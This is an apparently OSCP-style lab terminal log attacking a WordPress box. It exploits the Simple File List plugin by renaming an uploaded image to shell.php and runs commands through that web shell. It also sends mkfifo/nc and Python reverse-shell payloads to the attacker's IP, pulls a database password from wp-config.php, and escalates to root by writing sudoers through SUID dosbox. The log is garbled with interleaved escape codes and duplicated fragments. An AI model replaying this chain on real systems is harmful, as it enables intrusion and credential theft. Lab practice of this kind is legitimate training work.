eeSFL_FileAction"[115D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mp[33ml[33mu[33mg[33mi[33mn[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33mj[33ms[33m/[33me[33me[33m-[33mf[33mo[33mo[33mt[33me[33mr[33m.[33mj[33ms[33m"[39m[3C[32mg[32mr[32me[32mp[39m[6C[33m"[33mf[33mu[33mn[33mc[33mt[33mi[33mo[33mn[33m [33me[33me[33mS[33mF[33mL[33m_[33mF[33mi[33ml[33me[33mA[33mc[33mt[33mi[33mo[33mn[33m"[39m[?1l>[?2004l
+function eeSFL_FileAction(eeSFL_FileID, eeSFL_Action) {
+	
+	event.preventDefault(); // Don't follow link
+	
+	console.log(eeSFL_Action + ' -> ' + eeSFL_FileID);
+	
+	// The File Action Engine
+	var eeActionEngine = eeSFL_PluginURL + 'ee-file-engine.php';
+	
+	
+	// AJAX --------------
+	
+	// Get the Nonce
+	var eeSFL_ActionNonce = jQuery('#eeSFL_ActionNonce').text();
+	
+	if(eeSFL_Action == 'Rename') {
+		
+		var eeSFL_OldFileName = jQuery('#eeSFL_RowID-' + eeSFL_FileID + ' span.eeSFL_RealFileName').text(); // Current File Name
+		var eeSFL_NewFileName = jQuery('#eeSFL_RowID-' + eeSFL_FileID + ' input.eeNewFileName').val();
+		
+		// Sanitize to match reality
+		eeSFL_NewFileName = eeSFL_NewFileName.replace(/ /g, '-'); // Deal with spaces
+		eeSFL_NewFileName = eeSFL_NewFileName.replace(/--/g, '-'); // Deal with double dash
+		
+		if(eeSFL_OldFileName.indexOf('.') == -1) { // It's a folder
+			
+			eeSFL_NewFileName = eeSFL_NewFileName.replace(/\./g, '_'); // Replace dots
+		
+		} else { 
+			
+			if(eeSFL_N
+$ [15:54:20] curl -s "http://$BoxIP/index.php/sample-page/" | grep -i "eeSFL_ActionNonce\|eeSFL_ListID\|eeSFL_ListFolder\|eeSFL_PluginURL"
+
+$ [15:54:41] curl -s "http://$BoxIP/index.php/sample-page/" | grep -A10 "<script" | grep -i "eeSFL\|eeList\|eePlugin"
+ewFileName.indexOf('.') == -1) { // Disallow removing extension
+				return false;
+			}
+			
+			// Remove dots from name-part
+			var eeArray = eeSFL_NewFileName.split('.');
+			
+			if(eeArray.length > 2) {
+				
+				console.log('Problem Filename: ' + eeSFL_NewFileName);
+				
+				var eeExt = eeArray.pop();
+				var eeNewFileName = '';
+				
+				for(i = 0; i < eeArray.length; i++) {
+					eeNewFileName += eeArray[i] + '_';
+				}
+				eeNewFileName = eeNewFileName.substring(0, eeNewFileName.length - 1); // Strip last dash
+				
+				eeSFL_NewFileName = eeNewFileName + '.' + eeExt;
+			}
+		}
+	
+		var eeFormData = {
+			'eeSFL_ID': eeSFL_ListID,
+			'eeFileOld': eeSFL_OldFileName,
+			'eeListFolder': eeSFL_ListFolder,
+			'eeFileAction': eeSFL_Action + '|' + eeSFL_NewFileName,
+			'eeSecurity': eeSFL_ActionNonce
+		};
+	
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:53:48][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP/index.php/sample-page/" | grep -i "eeSFL_ActionNonce\|eeSFL_ListID\|eeSFL_ListFolder\|eeSFL_PluginURL"[125D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mi[33mn[33md[33me[33mx[33m.[33mp[33mh[33mp[33m/[33ms[33ma[33mm[33mp[33ml[33me[33m-[33mp[33ma[33mg[33me[33m/[33m"[39m[3C[32mg[32mr[32me[32mp[39m[4C[33m"[33me[33me[33mS[33mF[33mL[33m_[33mA[33mc[33mt[33mi[33mo[33mn[33mN[33mo[33mn[33mc[33me[33m\[33m|[33me[33me[33mS[33mF[33mL[33m_[33mL[33mi[33ms[33mt[33mI[33mD[33m\[33m|[33me[33me[33mS[33mF[33mL[33m_[33mL[33mi[33ms[33mt[33mF[33mo[33ml[33md[33me[33mr[33m\[33m|[33me[33me[33mS[33mF[33mL[33m_[33mP[33ml[33mu[33mg[33mi[33mn[33mU[33mR[33mL[33m"[39m[?1l>[?2004l
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:54:21][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP/index.php/sample-page/" | grep -A10 "<script" | grep -i "eeSFL\|eeList\|eePlugin"[104D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mi[33mn[33md[33me[33mx[33m.[33mp[33mh[33mp[33m/[33ms[33ma[33mm[33mp[33ml[33me[33m-[33mp[33ma[33mg[33me[33m/[33m"[39m[3C[32mg[32mr[32me[32mp[39m[6C[33m"[33m<[33ms[33mc[33mr[33mi[33mp[33mt[33m"[39m[3C[32mg[32mr[32me[32mp[39m[4C[33m"[33me[33me[33mS[33mF[33mL[33m\[33m|[33me[33me[33mL[33mi[33ms[33mt[33m\[33m|[33me[33me[33mP[33ml[33mu[33mg[33mi[33mn[33m"[39m[?1l>[?2004l
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:54:41][39m $ [K[?1h=[?2004hcurl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-file-engine.php" \
+  -H "X-Requested-With: XMLHttpRequest" \[K
+  -H "Referer: http://$BoxIP/wp-admin/admin.php?page=ee-simple-file-list&tab=file_list&eeListID=1" \[K
+  -d "eeSFL_ID=1&eeFileOld=shell.png&eeListFolder=/&eeFileAction=Rename|shell.php"[K[3A[34D[32mc[32mu[32mr[32ml[39m[12C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mp[33ml[33mu[33mg[33mi[33mn[
+$ [15:56:35] curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-file-engine.php" \
+  -H "X-Requested-With: XMLHttpRequest" \
+  -H "Referer: http://$BoxIP/wp-admin/admin.php?page=ee-simple-file-list&tab=file_list&eeListID=1" \
+  -d "eeSFL_ID=1&eeFileOld=shell.png&eeListFolder=/&eeFileAction=Rename|shell.php"
+
+$ [15:56:56] curl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php?cmd=id"
+
+=== SESSION RECONNECT: 2026-08-27 15:57:51 ===
+
+$ [15:57:54] htblog
+
+=== OUTPUT CAPTURE START: 2026-08-27 15:57:54 ===
+
+$ [15:58:03] nc -lvnp 4444
+33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33me[33me[33m-[33mf[33mi[33ml[33me[33m-[33me[33mn[33mg[33mi[33mn[33me[33m.[33mp[33mh[33mp[33m"[39m[1B[129D[33m"[33mX[33m-[33mR[33me[33mq[33mu[33me[33ms[33mt[33me[33md[33m-[33mW[33mi[33mt[33mh[33m:[33m [33mX[33mM[33mL[33mH[33mt[33mt[33mp[33mR[33me[33mq[33mu[33me[33ms[33mt[33m"[39m[1B[34D[33m"[33mR[33me[33mf[33me[33mr[33me[33mr[33m:[33m [33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33ma[33md[33mm[33mi[33mn[33m/[33ma[33md[33mm[33mi[33mn[33m.[33mp[33mh[33mp[33m?[33mp[33ma[33mg[33me[33m=[33me[33me[33m-[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m&[33mt[33ma[33mb[33m=[33mf[33mi[33ml[33me[33m_[33ml[33mi[33ms[33mt[33m&[33me[33me[33mL[33mi[33ms[33mt[33mI[33mD[33m=[33m1[33m"[39m[1B[93D[33m"[33me[33me[33mS[33mF[33mL[33m_[33mI[33mD[33m=[33m1[33m&[33me[33me[33mF[33mi[33ml[33me[33mO[33ml[33md[33m=[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mn[33mg[33m&[33me[33me[33mL[33mi[33ms[33mt[33mF[33mo[33ml[33md[33me[33mr[33m=[33m/[33m&[33me[33me[33mF[33mi[33ml[33me[33mA[33mc[33mt[33mi[33mo[33mn[33m=[33mR[33me[33mn[33ma[33mm[33me[33m|[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mh[33mp[33m"[39m[?1l>[?2004l
+SUCCESS[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:56:36][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php?cmd=id"[76D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mu[33mp[33ml[33mo[33ma[33md[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mh[33mp[33m?[33mc[33mm[33md[33m=[33mi[33md[33m"[39m[?1l>[?2004l
+uid=33(http) gid=33(http) groups=33(http)
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:56:56][39m $ [K[?1h=[?2004h[0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:57:51][39m $ curl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php" \[K
+  --get --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $LocalIP 4444 >/tmp/f"[K[A[A[60D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mu[33mp[33ml[33mo[33ma[33md[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mh[33mp[33m"[39m[2B[92D[33m"[33mc[33mm[33md[33m=[33mr[33mm[33m [33m/[33mt[33mm[33mp[33m/[33mf[33m;[33mm[33mk[33mf[33mi[33mf[33mo[33m [33m/[33mt[33mm[33mp[33m/[33mf[33m;[33mc[33ma[33mt[33m [33m/[33mt[33mm[33mp[33m/[33mf[33m|[33m/[33mb[33mi[33mn[33m/[33mb[33ma[33ms[33mh[33m [33m-[33mi[33m [33m2[33m>[33m&[33m1[33m|[33mn[33mc[33m [36m$[36mL[36mo[36mc[36ma[36ml[36mI[36mP[39m[33m [33m4[33m4[33m4[33m4[33m [33m>[33m/[33mt[33mm[33mp[33m/[33mf[33m"[39m
+$ [15:58:25] curl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php" \
+  --get --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $LocalIP 4444 >/tmp/f"
+
+$ [15:59:26] sudo nc -lvnp 80
+
+$ [15:59:45] curl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php" \
+  --get --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $LocalIP 80 >/tmp/f"
+
+=== SESSION RECONNECT: 2026-08-27 16:00:22 ===
+
+$ [16:00:26] htblog
+
+=== OUTPUT CAPTURE START: 2026-08-27 16:00:26 ===
+
+$ [16:00:32] sudo tcpdump -i tun0 icmp
+
+$ [16:00:41] curl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php?cmd=ping+-c+3+$LocalIP"
+[?1l>[?2004l
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:58:26][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php" \[K
+  --get --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $LocalIP 80 >/tmp/f"[K[A[A[58D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mu[33mp[33ml[33mo[33ma[33md[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mh[33mp[33m"[39m[2B[92D[33m"[33mc[33mm[33md[33m=[33mr[33mm[33m [33m/[33mt[33mm[33mp[33m/[33mf[33m;[33mm[33mk[33mf[33mi[33mf[33mo[33m [33m/[33mt[33mm[33mp[33m/[33mf[33m;[33mc[33ma[33mt[33m [33m/[33mt[33mm[33mp[33m/[33mf[33m|[33m/[33mb[33mi[33mn[33m/[33mb[33ma[33ms[33mh[33m [33m-[33mi[33m [33m2[33m>[33m&[33m1[33m|[33mn[33mc[33m [36m$[36mL[36mo[36mc[36ma[36ml[36mI[36mP[39m[33m [33m8[33m0[33m [33m>[33m/[33mt[33mm[33mp[33m/[33mf[33m"[39m[?1l>[?2004l
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:59:45][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php?cmd=ping+-c+3+$LocalIP"[K[A[26C[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mu[33mp[33ml[33mo[33ma[33md[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mh[33mp[33m?[33mc[33mm[33md[33m=[33mp[33mi[33mn[33mg[33m+[33m-[33mc[33m+[33m3[33m+[36m$[36mL[36mo[36mc[36ma[36ml[36mI[36mP[39m[33m"[39m[?1l>[?2004l
+PING 192.168.45.194 (192.168.45.194) 56(84) bytes of data.
+64 bytes from 192.168.45.194: icmp_seq=1 ttl=61 time=15.4 ms
+64 bytes from 192.168.45.194: icmp_seq=2 ttl=61 time=68.7 ms
+64 bytes from 192.168.45.194: icmp_seq=3 ttl=61 time=8.61 ms
+
+--- 192.168.45.194 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2003ms
+rtt min/avg/max/mdev = 8.606/30.903/68.699/26.869 ms
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:00:43][39m $ [K[?1h=[?2004hcurl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php" \[K
+  --get --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"192.168.45.194\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"[K[3A[64D[32mc[32mu[32mr[32ml[39m[4C[33m"[33mh[33mt[33mt[33mp[33m:[33m/[33m/[36m$[36mB[36mo[36mx[36mI[36mP[39m[33m/[33mw[33mp[33m-[33mc[33mo[33mn[33mt[33me[33mn[33mt[33m/[33mu[33mp[33ml[33mo[33ma[33md[33ms[33m/[33ms[33mi[33mm[33mp[33ml[33me[33m-[33mf[33mi[33ml[33me[33m-[33ml[33mi[33ms[33mt[33m/[33ms[33mh[33me[33ml[33ml[33m.[33mp[33mh[33mp[33m"[39m[2B[92D[33m"[33mc[33mm[33md[33m=[33mp[33my[33mt[33mh[33mo[33mn[33m3[33m [33m-[33mc[33m [33m'[33mi[33mm[33mp[33mo[33mr[33mt[33m [33ms[33mo[33mc[33mk[33me[33mt[33m,[33ms[33mu[33mb[33mp[33mr[33mo[33mc[33me[33ms[33ms[33m,[33mo[33ms[33m;[33ms[33m=[33ms[33mo[33mc[33mk[33me[33mt[33m.[33ms[33mo[33mc[33mk[33me[33mt[33m(
+$ [16:01:32] curl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php" \
+  --get --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"192.168.45.194\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
+
+$ [16:03:03] stty raw -echo; fg
+
+=== SESSION RECONNECT: 2026-08-27 16:04:33 ===
+
+$ [16:04:37] htblog
+
+=== OUTPUT CAPTURE START: 2026-08-27 16:04:37 ===
+
+$ [16:04:39] loot flag user aec3fbe30ec66d42a80a097bfe0775a3
+
+$ [16:05:47] loot cred commander CommanderKeenVorticons1990
+
+$ [16:05:54] boxset Password CommanderKeenVorticons1990
+
+$ [16:06:01] boxset Username commander
+Script started on 2026-08-27 15:57:54+01:00 [COMMAND="zsh -i" TERM="xterm-256color" TTY="/dev/pts/7" COLUMNS="117" LINES="55"]
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:57:54][39m $ [K[?1h=[?2004hn[4mn[24m[4mn[4mc[24m[24m[32mn[24m[32mc[39m[32mn[32mc[32m [39m[32mn[32mc[39m[39m -lvnp 4444[?1l>[?2004l
+Listening on 0.0.0.0 4444
+^C
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[15:59:17][39m $ [K[?1h=[?2004hnc -lvnp 4444[13D[32mn[32mc[39m[11C [90m4[39m [39m [90m44[39m [39m [39m [90m444[39m [39m [39m [39m [90m4444[39m[39m8[39m [39m [39m 0[39ms[32mn[32mc[39m -lvnp 80[11D[1m[31ms[1m[31mn[1m[31mc[0m[39m[1m[31ms[1m[31mu[1m[31mn[1m[31mc[0m[39m -lvnp 80[11D[1m[31md[1m[31mn[1m[31mc[0m[39m -lvnp 80[11D[1m[31mo[1m[31mn[1m[31mc[0m[39m -lvnp 80[11D[1m[31m [1m[31mn[1m[31mc[0m[39m -lvnp 80[11D[0m[4m[32ms[0m[4m[32mu[0m[4m[32md[0m[4m[32mo[24m[39m[0m[39m [0m[32mn[0m[32mc[39m[?1l>[?2004l
+[sudo] password for kali: 
+Listening on 0.0.0.0 80
+Connection received on 192.168.183.105 33730
+bash: cannot set terminal process group (300): Inappropriate ioctl for device
+bash: no job control in this shell
+[http@nukem simple-file-list]$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+[http@nukem simple-file-list]$ ^Z
+zsh: suspended  sudo nc -lvnp 80
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:02:52][39m $ [K[?1h=[?2004hstty raw -echo; fg[18D[32ms[32mt[32mt[32my[39m[12C[32mf[32mg[39m[?1l>[?2004l
+[1]  + continued  sudo nc -lvnp 80
+
+[http@nukem simple-file-list]$ export TERM=xterm
+[http@nukem simple-file-list]$ whoami
+http
+[http@nukem simple-file-list]$ cd /home
+[http@nukem home]$ ls
+commander
+[http@nukem home]$ cd commander
+[http@nukem commander]$ ls
+Desktop  local.txt  python_rest_flask
+[http@nukem commander]$ cat local.txt
+aec3fbe30ec66d42a80a097bfe0775a3
+[http@nukem commander]$ cat /srv/http/wp-config.php | grep -E "DB_NAME|DB_USER|DBB_PASSWORD"
+define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'commander' );
+define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
+[http@nukem commander]$ su
+Password: 
+su: Authentication failure
+[http@nukem commander]$  su - commander
+Password: 
+]0;commander@nukem:~[commander@nukem ~]$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/ssh/ssh-keysign
+/usr/lib/Xorg.wrap
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/bin/fusermount
+/usr/bin/su
+/usr/bin/ksu
+/usr/bin/gpasswd
+/usr/bin/pkexec
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/expiry
+/usr/bin/mount
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/chage
+/usr/bin/dosbox
+/usr/bin/newgrp
+/usr/bin/mount.cifs
+/usr/bin/suexec
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/sg
+/usr/bin/unix_chkpwd
+]0;commander@nukem:~[commander@nukem ~]$ dosbox -c 'mount c /etc' -c 'echo commander ALL=(ALL) NOPASSSWD: ALL > c:\sudoers' -c 'exit'
+DOSBox version 0.74-3
+Copyright 2002-2019 DOSBox Team, published under GNU GPL.
+---
+ALSA lib confmisc.c:767:(parse_card) cannot find card '0'
+ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
+ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
+ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
+ALSA lib confmisc.c:1246:(snd_func_refer)
+$ [16:14:04] proof linux
+Script started on 2026-08-27 16:04:37+01:00 [COMMAND="zsh -i" TERM="xterm-256color" TTY="/dev/pts/13" COLUMNS="117" LINES="12"]
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:04:37][39m $ [K[?1h=[?2004hloot flag user aec3fbe30ec66d42a80a097bfe0775a3[47D[32ml[32mo[32mo[32mt[39m[43C[?1l>[?2004l
+[+] Flag saved:  user = aec3fbe30ec66d42a80a097bfe0775a3  →  loot/flags.txt
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:04:39][39m $ [K[?1h=[?2004hloot cred commander CommanderKeenVorticons1990[46D[32ml[32mo[32mo[32mt[39m[42C[?1l>[?2004l
+[+] Cred saved:  commander:CommanderKeenVorticons1990  →  loot/creds.txt
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:05:47][39m $ [K[?1h=[?2004hboxset Password CommanderKeenVorticons1990[42D[32mb[32mo[32mx[32ms[32me[32mt[39m[36C[?1l>[?2004l
+[+] Password=CommanderKeenVorticons1990 (saved to .env)
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:05:54][39m $ [K[?1h=[?2004hboxset Username commander[25D[32mb[32mo[32mx[32ms[32me[32mt[39m[19C[?1l>[?2004l
+[+] Username=commander (saved to .env)
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:06:01][39m $ [K[?1h=[?2004h[0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:11:07][39m $ [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:11:07][39m $ [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:11:07][39m $ [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:11:07][39m $ [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:11:07][39m $ [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:11:08][39m $ [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:11:08][39m $ [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:11:08][39m $ [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:11:08][39m $ [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:11:08][39m $ proof linux[11D[32mp[32mr[32mo[32mo[32mf[39m[6C[?1l>[?2004l
+
+  whoami && id && hostname && ifconfig && cat /root/proof.txt
+  whoami && id && hostname && ifconfig && cat /home/*/local.txt
+
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:14:04][39m $ [?1h=[?2004h[0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:14:08][39m $ [K[0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:14:08][39m $ [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:14:08][39m $ [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:14:08][39m $ [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:14:08][39m $ [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Nukem[39m [33m[16:14:08][39m $ [0m[27m[24m
+$ [16:15:47] loot flag root b3546b5ae88d781de126ddb1929fb883
+
+$ [16:26:09] cp ~/Platforms/Offsec/Nukem/Nukem.log ~/Documents/Obsidian/main-vault/OSCP/BOXES/BOX\ LOGS/
